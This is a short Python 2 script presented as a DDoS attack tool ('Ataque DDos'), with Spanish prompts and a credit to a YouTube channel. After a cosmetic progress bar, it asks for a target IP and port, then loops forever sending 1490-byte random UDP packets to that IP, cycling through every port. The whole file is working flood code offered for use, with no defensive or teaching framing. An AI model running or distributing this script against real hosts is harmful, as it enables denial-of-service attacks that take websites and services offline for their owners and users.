import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Ataque DDos ")
print
print "Autores: Endermans Web"
print "YouTube:https://www.youtube.com/channel/UC7Zu4kfu0cmoi0xLXrJ1FPw"
print "Creador: Hackers YT"
ip = raw_input("INSERTE IP DE LA PAGINA : ")
port = input("INSERTE PUERTO      : ")

os.system("clear")
os.system("figlet starting attack")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviando %s paquetes a %s atravez del puerto:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
